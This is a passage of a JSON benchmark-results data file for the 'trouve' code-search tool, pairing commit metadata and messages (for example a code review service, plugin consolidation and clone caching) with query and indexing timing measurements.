            "value": 76.36247458,
            "range": "± 1.4",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 65.26075192,
            "range": "± 1.6",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "038dbb602538285e939617e5d2858c7b7b684996",
          "message": "Show Codex reasoning summaries (#114)\n\n* Show Codex reasoning summaries\n\n* Deduplicate Codex reasoning parsing",
          "timestamp": "2026-07-20T04:04:09-04:00",
          "tree_id": "9b7806d3860680eb30559fab2c1eb84a75dfaf28",
          "url": "https://github.com/jimsimon/trouve/commit/038dbb602538285e939617e5d2858c7b7b684996"
        },
        "date": 1784534734468,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 144.41784360000003,
            "range": "± 3.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 73.43841087999999,
            "range": "± 3.2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 88.83328278,
            "range": "± 4.9",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 74.50092438,
            "range": "± 4.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "a921c6673de2cdff3cdda5e5c565b29f751d8022",
          "message": "Show subscription health in model picker (#84)\n\n* Show subscription health in model picker\n\n* Address subscription health review feedback\n\n* Harden subscription refresh and composer layout\n\n* Refresh subscriptions after batched turns",
          "timestamp": "2026-07-20T04:11:15-04:00",
          "tree_id": "d458660358b5a122dea88782c7e26e4f097c90c1",
          "url": "https://github.com/jimsimon/trouve/commit/a921c6673de2cdff3cdda5e5c565b29f751d8022"
        },
        "date": 1784535155712,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 133.14815416,
            "range": "± 4.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 71.64175498,
            "range": "± 1",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 84.80404638000002,
            "range": "± 1.7",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 69.09135210000001,
            "range": "± 1.5",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "870fb619685c05269140292c28f60ae668e44c57",
          "message": "Batch GitHub pull request reads with GraphQL (#119)\n\n* Batch GitHub pull request reads with GraphQL\n\nReplace the dashboard REST fan-out and branch lookups with GraphQL queries so the one-minute refresh stays within GitHub rate limits. Preserve structured server errors for empty client responses so refresh failures remain actionable.\n\n* Address GitHub refresh review findings",
          "timestamp": "2026-07-20T14:35:17-04:00",
          "tree_id": "2a487e2a9a9e98da142afa2189df5a5e00e6d84e",
          "url": "https://github.com/jimsimon/trouve/commit/870fb619685c05269140292c28f60ae668e44c57"
        },
        "date": 1784572616910,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 141.9699147,
            "range": "± 11.9",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 73.02808730000001,
            "range": "± 2.7",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 93.66861196,
            "range": "± 0.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 70.40191194,
            "range": "± 1.5",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "71f0a74fc146b2a3b468252b759edf48ac4722e2",
          "message": "Show YOLO warning as permissions tooltip (#121)\n\n* Show YOLO warning as selector tooltip\n\n* Label YOLO warning for assistive technology",
          "timestamp": "2026-07-20T14:35:58-04:00",
          "tree_id": "0cf58bd86e71b8b5946b9d83a5f7a206ebd9ff47",
          "url": "https://github.com/jimsimon/trouve/commit/71f0a74fc146b2a3b468252b759edf48ac4722e2"
        },
        "date": 1784572734944,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 117.30532226000001,
            "range": "± 5.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 65.20218022,
            "range": "± 1.3",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 75.40918344,
            "range": "± 1.2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 63.36992322000001,
            "range": "± 1.3",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "06ca57180340a1318324ea9b1467d6e5ccafffde",
          "message": "Update all non-major dependencies (#126)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-20T14:52:54-04:00",
          "tree_id": "7595034bb3ceed3796cb986ce1a42281559bd1af",
          "url": "https://github.com/jimsimon/trouve/commit/06ca57180340a1318324ea9b1467d6e5ccafffde"
        },
        "date": 1784573728246,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 130.23575702,
            "range": "± 9.5",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 73.69722844000002,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 84.30792458,
            "range": "± 1.6",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 73.49921912,
            "range": "± 7.1",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c542605c5413bb047fdc0e53f039bbcc6bd590c9",
          "message": "Cache GitHub PR details and refresh every 30 seconds (#134)\n\n* Cache GitHub dashboard details\n\n* Refresh PR dashboards every 30 seconds\n\nReplace manual PR refresh controls with a live freshness clock while the cached account feed updates both dashboard views automatically.\n\n* Bound GitHub dashboard refreshes\n\nElide the freshness status within the available header width and time out stalled per-host dashboard requests so they release the shared cache lock.",
          "timestamp": "2026-07-20T22:22:17-04:00",
          "tree_id": "9da5898c0c1667c51e0b5b46e9b9292b43e8e272",
          "url": "https://github.com/jimsimon/trouve/commit/c542605c5413bb047fdc0e53f039bbcc6bd590c9"
        },
        "date": 1784600696847,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 127.75977964000002,
            "range": "± 1045.4",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 74.05719856,
            "range": "± 2.5",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 85.38139960000001,
            "range": "± 2",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 72.73382128,
            "range": "± 1.5",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "29139614+renovate[bot]@users.noreply.github.com",
            "name": "renovate[bot]",
            "username": "renovate[bot]"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "aa113ce876066093acb00ab45e4c6c9f6c1f5eb6",
          "message": "Update Rust crate libc to v0.2.187 (#139)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>",
          "timestamp": "2026-07-21T01:34:46-04:00",
          "tree_id": "56c10f753592fa8040d2c6479bf92e2b59dc3615",
          "url": "https://github.com/jimsimon/trouve/commit/aa113ce876066093acb00ab45e4c6c9f6c1f5eb6"
        },
        "date": 1784612250599,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 131.99236212000002,
            "range": "± 4.8",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 68.5284388,
            "range": "± 1.8",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 80.03115822,
            "range": "± 1.8",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 67.94318238,
            "range": "± 1.4",
            "unit": "ms"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "9bb2f698bb803c5ffd84a7a3ac6bbb0ce16a2a4f",
          "message": "Add GitHub App code review service (#145)\n\n* Add GitHub App code review service\n\n* Publish review service images to GHCR\n\n* Align container images with releases\n\n* Address code review feedback\n\n* Address follow-up review feedback\n\n* Clarify code review deployment setup\n\n* Fix parity CI dependency\n\n* Address terminal review cleanup feedback\n\n* Cancel superseded code reviews\n\n* Add multi-identity code reviews\n\nReview every changed file in bounded batches, run configurable native or custom focused identities, and validate and deduplicate findings before publishing.\n\n* Rename review identities to reviewers\n\nUse Reviewer Profile for configuration while presenting built-in and custom reviewers consistently across the API, dashboard, and documentation.\n\n* Add per-repository reviewer overrides\n\n* Address code review reliability feedback\n\n* Isolate code review reconciliation failures\n\n* Isolate review jobs and release publication\n\n* Track active code review turns\n\n* Serialize latest container publication",
          "timestamp": "2026-07-21T20:27:59-04:00",
          "tree_id": "f91365529b367dd640598322f82009add2319cd5",
          "url": "https://github.com/jimsimon/trouve/commit/9bb2f698bb803c5ffd84a7a3ac6bbb0ce16a2a4f"
        },
        "date": 1784680221095,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "cold index + query",
            "value": 119.94809384000001,
            "range": "± 83",
            "unit": "ms"
          },
          {
            "name": "warm query",
            "value": 50.35328166,
            "range": "± 3.8",
            "unit": "ms"
          },
          {
            "name": "incremental (1 file modified)",
            "value": 69.12539708000001,
            "range": "± 15.5",
            "unit": "ms"
          },
          {
            "name": "non-git warm query",
            "value": 54.12302624,
            "range": "± 1.6",
            "unit": "ms"
          }
        ]
      }
    ],
    "micro-benchmarks": [
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c54a63d163682009cd91a59851bd623c93a9f52a",
          "message": "Benchmark git vs non-git roots; gate CI on benchmark regressions (#1)\n\n* Benchmark git vs non-git roots on kubernetes\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Guard TOUCH_REL pipeline against SIGPIPE under pipefail\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Update git vs non-git numbers to committed-script run\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Gate CI on benchmark regressions\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Fix racy shared model dir in embed parity tests\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Persist benchmark data to gh-pages instead of the actions cache\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address review: harden bench scripts and workflow\n\n- Resolve caller-supplied repo paths before cd; error instead of cloning over a missing user path\n- Shell-escape all values interpolated into hyperfine command strings; drop eval in favor of direct invocations\n- Restore the incremental-scenario file via EXIT trap so failures leave the tree clean\n- Recursive criterion glob (grouped/parameterized bench IDs) and a loud duplicate-name guard in the converter\n- SHA-pin all actions, set persist-credentials: false on checkouts\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T13:51:39-04:00",
          "tree_id": "099ec6b183f6cb426cc60fe16491d57ba3cdda2a",
          "url": "https://github.com/jimsimon/trouve/commit/c54a63d163682009cd91a59851bd623c93a9f52a"
        },
        "date": 1783101292746,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4836295.05,
            "range": "± 7795",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36837.23729543497,
            "range": "± 33",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2963367.852941177,
            "range": "± 1289",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1285569.2848324515,
            "range": "± 2454",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "22d3e560019dc5635491b0b20caf7c55b621f2b1",
          "message": "Add tree-sitter grammars for 23 more languages (#5)\n\nBundle maintained crates.io grammars for CMake, D, Dart, Elm, ERB/EJS\ntemplates, Erlang, Fortran, Gleam, GraphQL, Groovy, HCL/Terraform,\nJulia, Make, Nix, Objective-C, Perl, PowerShell, Protocol Buffers, R,\nSolidity, SQL, Svelte, and XML (incl. DTD), bringing syntax-aware\nchunking to ~50 languages. Document the native language list and the\nline-based fallback tiers in the README.\n\nConsidered but excluded: tree-sitter-clojure (pins tree-sitter 0.25,\nconflicts with 0.26) and tree-sitter-dockerfile (pins tree-sitter 0.20).\n\nStripped x86_64 Linux release binary grows 50.9 MB -> 83.7 MB\n(gzipped: 7.5 MB -> 10.1 MB), dominated by the Fortran, Julia,\nObjective-C, and D parser tables.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T13:53:25-04:00",
          "tree_id": "aa7d8e8413c072d49db8b39aba53029798d7fba4",
          "url": "https://github.com/jimsimon/trouve/commit/22d3e560019dc5635491b0b20caf7c55b621f2b1"
        },
        "date": 1783101430500,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5052508.45,
            "range": "± 10489",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35875.32666630482,
            "range": "± 6",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2804065.6944444445,
            "range": "± 919",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1529569.7038398692,
            "range": "± 11718",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "7117bbc09c7dc497bac1c19bffd1d206b5411395",
          "message": "Fix new stable clippy lint manual_is_multiple_of (#3)\n\n* Fix new stable clippy lint manual_is_multiple_of\n\nCurrent stable clippy (-D warnings in lint CI) flags the manual modulo\nchecks in embed.rs and tests/embed_parity.rs. Use usize::is_multiple_of\nand raise the advertised MSRV to 1.87, where it was stabilized.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Remove clone_cache.rs committed by mistake\n\nThe file belongs to the separate clone-caching branch; it was untracked\nand slipped into the previous commit via git add -A.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T13:55:24-04:00",
          "tree_id": "0ea316d52639cfd8ec54abe1489580c9c927c3eb",
          "url": "https://github.com/jimsimon/trouve/commit/7117bbc09c7dc497bac1c19bffd1d206b5411395"
        },
        "date": 1783101558748,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4824395.35,
            "range": "± 9922",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37213.31794380587,
            "range": "± 29",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3056787.029411765,
            "range": "± 1658",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1374890.5306856188,
            "range": "± 8512",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "c941ab5bb6338796215d329e0389cbee2a09852b",
          "message": "Update LICENSE copyright holder to James Simon (#13)\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T15:03:48-04:00",
          "tree_id": "71414dea1f4009dd7ff10bb72b0ab2f69d867881",
          "url": "https://github.com/jimsimon/trouve/commit/c941ab5bb6338796215d329e0389cbee2a09852b"
        },
        "date": 1783105546979,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4799090.090909091,
            "range": "± 10963",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36713.62142038946,
            "range": "± 24",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2964038.970588235,
            "range": "± 1655",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1355977.4707052442,
            "range": "± 18106",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "01d6d607afdfba9532dfc392fa8ff390f1703010",
          "message": "Add trouve-native config names with deprecated semble fallbacks (#14)\n\n- .trouveignore is now honoured per directory (same gitignore semantics),\n  taking precedence over the deprecated .sembleignore where patterns\n  conflict; .sembleignore still works but logs a one-time deprecation\n  warning pointing at .trouveignore.\n- SEMBLE_CACHE_LOCATION, SEMBLE_MODEL_NAME, and SEMBLE_CLONE_TIMEOUT are\n  honoured as fallbacks when the TROUVE_* equivalent is unset, with the\n  same one-time deprecation warning.\n- .semble/ directories are skipped during walks alongside .trouve/,\n  matching upstream's default ignore list.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T16:46:36-04:00",
          "tree_id": "77de7c46fec7e1fb22775691563517390b8f6154",
          "url": "https://github.com/jimsimon/trouve/commit/01d6d607afdfba9532dfc392fa8ff390f1703010"
        },
        "date": 1783111717330,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5054409.15,
            "range": "± 10088",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 35675.966458333336,
            "range": "± 5",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2820735.472222222,
            "range": "± 1123",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1490320.6433483372,
            "range": "± 10255",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "93ea488b5d6edce49a23796bb4f7286707ef6472",
          "message": "Consolidate all agent plugins into one trouve-plugin package (#12)\n\n* Consolidate all agent plugins into one trouve-plugin package\n\nplugins/trouve is simultaneously the npm package trouve-plugin for\nOpenCode and Kilo Code (native tools backed by one persistent trouve\nstdio server per session), the Claude Code plugin bundle (MCP server,\nsub-agent, workflow skill, SessionStart index-warming hook; marketplace\nat .claude-plugin/marketplace.json), and the Codex plugin bundle (MCP\nserver + skill; marketplace at .agents/plugins/marketplace.json).\n\nThe OpenCode/Kilo plugin warms the project index at load and on\nsession.idle (throttled; warm:false disables). README gains an Agent\nintegrations feature grid comparing every install route.\n\nRebased onto main as a single commit, folding in all review fixes.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Address review: request timeouts, stderr capture, visible failures\n\n- request() now takes a per-request timeout (30s for the initialize\n  handshake, 10 minutes for tools/call to cover cold index builds of\n  huge repos). On timeout the pending request is rejected with an\n  actionable message and the server is killed so the next call starts\n  fresh — a stalled-but-alive server can no longer hang an agent turn.\n- The server's stderr is captured (last 2KB) and included in the\n  rejection message when the process exits unexpectedly.\n- The Claude SessionStart hook now fails visibly with an install hint\n  when the trouve binary is missing, instead of masking it with exit 0;\n  the warm itself still runs backgrounded via nohup.\n- Invalid content plugin-option values are reported via console.warn\n  instead of being silently dropped.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T17:21:03-04:00",
          "tree_id": "06ce1231852c1c9a4feede5fe15470ec8978f9f6",
          "url": "https://github.com/jimsimon/trouve/commit/93ea488b5d6edce49a23796bb4f7286707ef6472"
        },
        "date": 1783113781933,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4773579.954545455,
            "range": "± 7855",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36758.75185185185,
            "range": "± 29",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2935443.794117647,
            "range": "± 1741",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1353331.826388889,
            "range": "± 7278",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "bb36045e50014ccd97a4e394d3552b90cb557f5c",
          "message": "Keep crate, plugin, and package versions in sync — enforced in CI and releases (#11)\n\nscripts/sync_versions.py treats the crate version in Cargo.toml\n(parsed with tomllib) as the single source of truth and rewrites every\npublished manifest to match: plugins/*/package.json, package-lock.json\n(both version records), and Claude Code / Codex plugin.json manifests.\nLint CI runs it with --check so any drift fails the build.\n\nThe release workflow gains a verify-versions job (sync check + tag ==\ncrate version assertion, before any build) and a publish-npm job that\npublishes every plugins/*/package.json package at the same version\nafter the GitHub release — idempotent, and skipped cleanly when no npm\npackages exist or NPM_TOKEN is not configured. New checkout steps set\npersist-credentials: false.\n\nWith the unified plugin (#12) on main, the sync check now covers\nplugins/trouve. Rebased onto main as a single commit with all review\nfixes.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T17:38:25-04:00",
          "tree_id": "8f1adfb5bd3765e3db2792f5b4cd9abda4d2b44f",
          "url": "https://github.com/jimsimon/trouve/commit/bb36045e50014ccd97a4e394d3552b90cb557f5c"
        },
        "date": 1783114830680,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4821277.318181818,
            "range": "± 10204",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36889.59164292498,
            "range": "± 30",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 3080285.6176470593,
            "range": "± 1212",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1348077.005952381,
            "range": "± 7466",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "6b52916408d70e9c364e43cb3e7933573b43ccad",
          "message": "Cache shallow clones of remote repositories persistently (#4)\n\n* Cache shallow clones of remote repositories persistently\n\nfrom_git used to clone into a throwaway temp directory on every call,\nmaking the network-bound clone the dominant repeated cost of querying a\nremote repo (chunks and embeddings were already cached by the store).\n\nClones now persist under <cache>/clones keyed by URL (and optional\nref): refreshed via git fetch --depth 1 + hard reset at most once per\nfreshness window (TROUVE_CLONE_TTL seconds, default 300; the stamp\nadvances even on failed fetches so unreachable remotes are retried once\nper window), guarded by advisory file locks held for the whole index\nbuild, with stale clones served (with a warning) when the remote is\nunreachable. Idle clones and orphaned partials are evicted after a\nweek; trouve clear index reclaims per key while honouring locks and\nreports skipped in-use clones. Refs pass after --end-of-options.\n\nThe MCP server now re-validates git URLs after the same cooldown as\nlocal paths. Clone timeout honours the deprecated SEMBLE_CLONE_TIMEOUT\nfallback. MSRV rises to 1.89 for std file locking.\n\nRebased onto main (post-#12) as a single commit with all review fixes.\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n* Retrigger review of the rebased head\n\nCodeRabbit's rate limiter skipped the review of the previous push;\nall feedback from its last review round is addressed in that commit\n(clear_clones honours locks, failed refreshes advance the TTL stamp,\nchangelog conflict markers removed, test isolated to its own clone).\n\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T18:11:53-04:00",
          "tree_id": "c2f2c758dfec558d69085f35c7e8466d9e7d10b0",
          "url": "https://github.com/jimsimon/trouve/commit/6b52916408d70e9c364e43cb3e7933573b43ccad"
        },
        "date": 1783116837545,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 4853027.090909091,
            "range": "± 7578",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 37115.97875948237,
            "range": "± 32",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2951606.0588235296,
            "range": "± 1081",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1342083.738310709,
            "range": "± 7993",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "134c8e48abbdbec99793f0c76e327ed03cf5cd60",
          "message": "Add native OpenCode custom tools as an opt-in alternative to MCP (#6)\n\ntrouve install gains a fourth, opt-in integration (\"Native tool\")\nthat writes ~/.config/opencode/tools/trouve.ts: exports surface to the\nmodel as trouve_search and trouve_find_related, run the trouve CLI via\nBun.spawn with a 10-minute watchdog (SIGTERM, then SIGKILL after 5s)\nand a catch on the stream await so every failure path returns tool\noutput, default repo to the session worktree, and support a content\nargument. MCP remains the default integration and is never touched by\nthe tool file; instruction blocks render whichever tool names the\nselected integrations expose. Documented in the README's Agent\nintegrations grid.\n\nRebased onto main (post-#4/#11) as a single commit with all review\nfixes.\n\nCo-authored-by: Cursor Agent <cursoragent@cursor.com>\nCo-authored-by: Jim Simon <jimsimon@users.noreply.github.com>",
          "timestamp": "2026-07-03T18:21:46-04:00",
          "tree_id": "2e99cc8b211f50fd466ffb86c3ae3f15c336ee77",
          "url": "https://github.com/jimsimon/trouve/commit/134c8e48abbdbec99793f0c76e327ed03cf5cd60"
        },
        "date": 1783117430922,
        "tool": "customSmallerIsBetter",
        "benches": [
          {
            "name": "bm25_build_5k_docs",
            "value": 5167545.75,
            "range": "± 13863",
            "unit": "ns"
          },
          {
            "name": "bm25_query_5k_docs",
            "value": 36375.539863445374,
            "range": "± 6",
            "unit": "ns"
          },
          {
            "name": "chunk_python_200_functions",
            "value": 2805324.25,
            "range": "± 3210",
            "unit": "ns"
          },
          {
            "name": "dense_query_20k_rows",
            "value": 1528145.2828407225,
            "range": "± 8369",
            "unit": "ns"
          }
        ]
      },
      {
        "commit": {
          "author": {
            "email": "jim.j.simon@gmail.com",
            "name": "Jim Simon",
            "username": "jimsimon"
          },
          "committer": {
            "email": "noreply@github.com",
            "name": "GitHub",
            "username": "web-flow"
          },
          "distinct": true,
          "id": "3ffd6848b3649fe9c20668def17396487e7ad869",
